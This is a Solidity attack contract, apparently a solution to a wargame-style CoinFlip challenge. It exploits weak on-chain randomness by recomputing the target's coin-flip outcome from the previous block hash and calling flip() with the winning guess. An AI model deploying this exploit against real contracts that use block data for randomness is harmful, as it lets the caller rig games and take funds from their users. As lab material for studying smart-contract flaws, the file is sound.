// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "./CoinFlip.sol";

contract CoinFlipAttack {
    using SafeMath for uint256;
    CoinFlip public coinFlip;

    constructor(address _addr) {
        coinFlip = CoinFlip(_addr);
    }

    function magicGuess() external returns (bool) {
        uint256 lastHash = uint256(blockhash(block.number.sub(1)));

        uint256 n = lastHash.div(
            57896044618658097711785492504343953926634992332820282019728792003956564819968
        );

        bool answer = n == 1 ? true : false;

        return coinFlip.flip(answer);
    }
}
